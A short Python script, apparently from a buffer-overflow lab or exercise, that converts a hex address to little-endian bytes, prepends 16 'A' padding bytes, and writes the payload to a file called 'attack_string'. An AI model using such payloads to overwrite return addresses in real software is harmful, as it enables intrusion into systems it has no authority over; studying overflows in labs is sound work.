import sys

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    print("Usage: python script_name.py <argument>")
    sys.exit(1)
    
input_string =  sys.argv[1]

little_endian_bytes = bytes.fromhex(input_string)[::-1]
#print(little_endian_bytes)

output_bytes = b'A' * 16 + little_endian_bytes

with open("attack_string", "wb") as f:
    f.write(output_bytes)

print("***Output file 'attack_string' created successfully.***")
print("")